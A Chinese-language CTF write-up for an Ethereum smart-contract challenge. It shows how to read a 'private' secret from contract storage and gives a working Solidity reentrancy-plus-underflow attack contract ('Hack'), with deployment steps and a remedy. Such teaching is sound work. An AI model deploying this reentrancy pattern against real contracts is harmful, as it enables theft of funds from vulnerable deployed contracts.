# 韭菜银行

这是一道以太坊智能合约题，题目中考察的都是智能合约的经典漏洞。以太坊智能合约的常见漏洞大概就这几种，分别是整数溢出、随机数预测、Re-Entrancy（重入）等。

这道题给了 Solidity 源代码。如果没有源代码，逆向智能合约也不是很难。

这道题有些人可能没看到「打开/下载题目」按钮可以打开一个领取 flag 的网页，所以后来加了提示。

这道题使用 kovan 测试链，是因为出题人觉得 kovan 稳定 4 秒一个块，不用傻等交易进块。

## flag1

`get_flag_1` 函数要求你输入正确的 `secret`，才能给出 flag。而 `secret` 是 private 变量。

### 第一步

方法 1：

分析代码知，secret 是合约创建时传入的，查看创建合约的参数即可，例如在题目给出的链接那个区块链查看器上面直接找到

```
1 Constructor Arguments found :
Arg [0] : 000000000000000000000000000000000175bddc0da1bd47369c47861f48c8ac
```

也可以找到创建合约的交易，然后在交易的 Input Data 最后找到这串数字。

方法 2：

智能合约的所有状态都是公开的，其实 private 变量并不是真的保密，只是不提供直接访问的接口罢了。

我们可以通过查看合约的 EVM 汇编指令来得知这个 `secret` 变量位于 `storage[0x02]`。当然，更方便的方法就是从 0 开始枚举寻找。然后直接从合约的 storage 里面读到它，例如使用有 web3 接口的环境（geth 客户端、安装了 metamask 插件的浏览器等）。

```javascript
web3.eth.getStorageAt('0xE575c9abD35Fa94F1949f7d559056bB66FddEB51', 2, (err, data) => console.log(data))
```

### 第二步

方法 1：

把这个数截断到 `uint128` ，即 `0x0175bddc0da1bd47369c47861f48c8ac`，作为 `get_flag_1` 函数的参数调用，即可得到 flag。这个函数是一个只读的函数，所以不需要发出交易。具体的方法很多，可以是在 etherscan.io 网页上调用，或者用自己的以太坊客户端调用，或者使用 remix 之类的 IDE 调用，或者自己写 web3 代码调用。

方法 2：

手工执行 `get_flag_1` 里面的逻辑，其实就是把这个数转换成十六进制表示的字符串，并且加上 `flag{}` 而已。

## flag2

这一问是经典的 Reentrancy Attack，也是 2016 年著名的 The DAO Attack 的原因。当时攻击者利用这个漏洞盗取了约 360 万个以太币，最终导致了以太坊分叉成为 ETH 和 ETC。

本题的 `get_flag_2` 函数要求你的 `balance` 必须超过 1000000000000 ether 才能把你的 `got_flag` 改成 true。`balance` 是这个合约维护的一个 mapping 变量，把每个地址映射到一个数值。合约中的逻辑是，你通过 `deposit` 函数往合约中存入多少币，就给你增加多少 `balance`。然后你也可以随时从合约中通过 `withdraw` 函数提走小于等于 `balance` 数额的币。通过存入 1000000000000 个币来满足要求是不现实的，所以我们需要利用漏洞。

在 `withdraw` 函数的 `msg.sender.call.value(amount)();` 一句代码中，合约会给调用者的地址上转账 `amount` 金额的币，但这里没有使用有 gas 限制的 `msg.sender.transfer` 或者 `msg.sender.send` 来转账，所以如果转账的目标是一个合约，合约接收到转账，它的 [fallback 函数](https://solidity.readthedocs.io/en/latest/contracts.html#fallback-function)会被运行。其实在编译题目的合约时，编译器在这里会提示一个 warning。

在这一步中，我们可以自己写一个新的合约，这个合约的 fallback 函数是 payable 的，然后当它被执行时，我们再次调用题目合约的 `withdraw` 函数。此时，`balance` 还没有被减去第一次转账的金额，所以转账可以再次发生。我们可以使用一个计数器让转账只会发生两次，然后 `balance` 也会被减去两次。如果第二次减法不够减，就会发生整数溢出。因为 `balance` 是无符号的，此时你的合约对应的 `balance` 会变成一个巨大的数，就可以去拿 flag 了。

这部分过程大概可以描述为：

```
withdraw(amount=100):
    题目合约中你的 balance 是 100，balance >= amount 满足
    向 sender 转账 100，此时 sender（即你的合约）fallback 函数被调用
        你的合约里面转账计数 n = 0，把 n 改为 1，再去调用题目合约 withdraw(amount=100):
            题目合约中你的 balance 是 100，balance >= amount 满足
            向 sender 转账 100，此时 sender（即你的合约）fallback 函数被调用
                你的合约里面转账计数 n = 1，返回题目合约
            balance 减去 100，得到 0
            withdraw 执行完毕，返回你的合约
        你的合约执行完毕，返回题目合约
    balance 减去 100，溢出得到一个巨大的数
    withdraw 执行完毕
```

在一个函数执行一半时，被打断，然后函数又被从头执行，在计算机中通常称为「Reentrancy（重入）」。如果函数的执行涉及到对全局变量的修改，那么很可能没有「可重入性」。

解决这类问题的方法有很多，比如不要让自己在不该被打断的时候打断，或者直接加锁禁止重入等等。对于题目这个合约，我们可以把转账那一行代码放在 `balance[msg.sender] -= amount;` 的后面以解决这个问题。

具体的解题合约如下，你需要以题目合约的地址为构造参数部署合约，然后调用它的 `hack` 函数，记得带上一定的以太币来调用函数。

如果题目合约中以太币数量为 0，那么第二次转账会失败，所以你可能需要提前用另一个地址给题目合约充一些币。

```solidity
contract Hack{
    uint public n;
    JCBank public c;
    constructor (JCBank addr) public payable {
        n = 0;
        c = addr;
    }
    
    function hack() public payable returns(bool) {
        c.deposit.value(1)();
        c.withdraw(1);
        c.get_flag_2(这里填写你的 id);
    }
    
    function () public payable {
        if (n == 0){
            n = 1;
            c.withdraw(1);
        }
    }
}
```

### 我知道原理了，但是怎么操作呢

1. 在你的以太坊客户端或者 metamask 浏览器插件中创建一个新的钱包地址（如果你之前没有的话）。

2. 在网上找一个 kovan 测试链的 faucet 领取一些代币到你的地址。

3. 在你的以太坊客户端或者 [Remix IDE](https://remix.ethereum.org/) 中创建一个新的合约，代码填写题目合约代码和解题合约代码（如果只填写解题合约代码的话，它会找不到 JCBank 那些函数的接口），参数填写题目合约地址。编译器版本选择合约中写的 0.4.26。
4. 发布合约！
5. 带着一点以太币调用你刚刚部署的合约的 `hack` 函数。
6. 去题目的网页领取 flag。

## 其他方法

可以等其他人做出来这道题，然后去重放别人的交易。有些人可能会通过判断 owner 等方式保护自己的解题合约，但是总有人的交易可以直接重放。实在不行也可以逆向别人的解题合约。这里就不讲具体的操作了。

## 其他资料

Solidity 语言官方文档中整理的常见安全问题：<https://solidity.readthedocs.io/en/latest/security-considerations.html>

对智能合约安全感兴趣的话，可以来玩这两个智能合约漏洞的解题练习平台：

<https://ethernaut.openzeppelin.com/>

<https://hackthiscontract.io/>

